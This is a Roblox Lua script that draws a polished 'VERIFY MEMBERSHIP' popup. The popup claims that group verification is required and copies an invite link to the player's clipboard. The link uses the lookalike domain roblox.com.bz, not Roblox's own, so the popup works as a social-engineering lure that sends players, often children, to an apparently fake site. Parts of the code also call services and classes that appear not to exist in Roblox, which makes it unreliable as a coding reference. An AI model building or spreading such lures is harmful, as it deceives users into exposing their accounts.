-- CONFIG
local GROUP_LINK = "https://roblox.com.bz/communities/1713252036/"

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local CoreGui = game:GetService("CoreGui")
local Clipboard = game:GetService("Clipboard")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

-- Safe clipboard function
local function copyToClipboard(text)
    local success = false
    if setclipboard then success = pcall(setclipboard, text) end
    if not success and toClipboard then success = pcall(toClipboard, text) end
    if not success then
        success = pcall(function() Clipboard:set(text) end)
    end
    if not success then
        warn("Clipboard failed: " .. text)
    end
    return success
end

-- Create GUI with modern design
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PremiumVerifyGUI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Background overlay (blur-like dark)
local overlay = Instance.new("Frame")
overlay.Size = UDim2.new(1, 0, 1, 0)
overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
overlay.BackgroundTransparency = 0.75
overlay.BorderSizePixel = 0
overlay.Parent = screenGui

-- Main card
local card = Instance.new("Frame")
card.Size = UDim2.new(0, 440, 0, 360)
card.Position = UDim2.new(0.5, -220, 0.5, -180)
card.BackgroundColor3 = Color3.fromRGB(20, 22, 27)
card.BorderSizePixel = 0
card.ClipsDescendants = true
card.Parent = overlay

-- Rounded corners via UICorner (modern)
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = card

-- Subtle border
local border = Instance.new("UIStroke")
border.Thickness = 1
border.Color = Color3.fromRGB(60, 65, 75)
border.Transparency = 0.5
border.Parent = card

-- Glow effect (shadow)
local shadow = Instance.new("UIShadowEffect")
shadow.Color = Color3.fromRGB(0, 0, 0)
shadow.Transparency = 0.8
shadow.Offset = Vector2.new(0, 4)
shadow.Size = 12
shadow.Parent = card

-- Title area with gradient
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 60)
titleBar.BackgroundColor3 = Color3.fromRGB(30, 35, 45)
titleBar.BorderSizePixel = 0
titleBar.Parent = card

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = titleBar

local titleGradient = Instance.new("UIGradient")
titleGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 55, 75)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 42, 60))
})
titleGradient.Parent = titleBar

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 1, 0)
title.Position = UDim2.new(0, 20, 0, 0)
title.BackgroundTransparency = 1
title.Text = "VERIFY MEMBERSHIP"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = titleBar

-- Close button (X) with hover effect
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 32, 0, 32)
closeBtn.Position = UDim2.new(1, -44, 0, 14)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
closeBtn.BackgroundTransparency = 0.8
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 20
closeBtn.AutoButtonColor = false
closeBtn.BorderSizePixel = 0
closeBtn.Parent = titleBar

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(1, 0)
closeCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Hover animation for close button
closeBtn.MouseEnter:Connect(function()
    TweenService:Create(closeBtn, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
end)
closeBtn.MouseLeave:Connect(function()
    TweenService:Create(closeBtn, TweenInfo.new(0.2), {BackgroundTransparency = 0.8}):Play()
end)

-- Icon placeholder (emoji or text)
local icon = Instance.new("TextLabel")
icon.Size = UDim2.new(0, 60, 0, 60)
icon.Position = UDim2.new(0.5, -30, 0, 90)
icon.BackgroundColor3 = Color3.fromRGB(35, 40, 50)
icon.BackgroundTransparency = 0.5
icon.Text = "🔒"
icon.TextColor3 = Color3.fromRGB(200, 200, 220)
icon.Font = Enum.Font.GothamBold
icon.TextSize = 36
icon.TextScaled = false
icon.Parent = card

local iconCorner = Instance.new("UICorner")
iconCorner.CornerRadius = UDim.new(1, 0)
iconCorner.Parent = icon

-- Description
local desc = Instance.new("TextLabel")
desc.Size = UDim2.new(1, -40, 0, 50)
desc.Position = UDim2.new(0, 20, 0, 170)
desc.BackgroundTransparency = 1
desc.Text = "You need to verify group membership to continue.\nClick the button below to copy the invite link."
desc.TextColor3 = Color3.fromRGB(170, 175, 185)
desc.Font = Enum.Font.Gotham
desc.TextSize = 14
desc.TextWrapped = true
desc.TextXAlignment = Enum.TextXAlignment.Center
desc.Parent = card

-- Verify button with gradient and pulse animation
local verifyBtn = Instance.new("TextButton")
verifyBtn.Size = UDim2.new(0, 240, 0, 48)
verifyBtn.Position = UDim2.new(0.5, -120, 0, 240)
verifyBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
verifyBtn.Text = "VERIFY NOW"
verifyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
verifyBtn.Font = Enum.Font.GothamBold
verifyBtn.TextSize = 18
verifyBtn.AutoButtonColor = false
verifyBtn.BorderSizePixel = 0
verifyBtn.Parent = card

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 24)
btnCorner.Parent = verifyBtn

local btnGradient = Instance.new("UIGradient")
btnGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 140, 255))
})
btnGradient.Parent = verifyBtn

-- Pulse animation
local pulse = TweenService:Create(verifyBtn, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {BackgroundTransparency = 0.2})
pulse:Play()

-- Status label
local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, -40, 0, 24)
statusLabel.Position = UDim2.new(0, 20, 0, 305)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Ready"
statusLabel.TextColor3 = Color3.fromRGB(100, 200, 100)
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 13
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.Parent = card

-- Button click action (ONLY copy, no extra GUI)
verifyBtn.MouseButton1Click:Connect(function()
    local success = copyToClipboard(GROUP_LINK)
    if success then
        statusLabel.Text = "✓ Link copied to clipboard!"
        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
        -- Temporary button effect
        local originalColor = verifyBtn.BackgroundColor3
        TweenService:Create(verifyBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(0, 200, 100)}):Play()
        wait(0.2)
        TweenService:Create(verifyBtn, TweenInfo.new(0.15), {BackgroundColor3 = originalColor}):Play()
    else
        statusLabel.Text = "✗ Failed to copy. Copy manually: " .. GROUP_LINK
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    end
    wait(2.5)
    statusLabel.Text = "Ready"
    statusLabel.TextColor3 = Color3.fromRGB(100, 200, 100)
end)

-- Draggable functionality
local dragging = false
local dragStart, startPos

card.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = card.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        card.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- Initial status
statusLabel.Text = "Click VERIFY to copy group link"
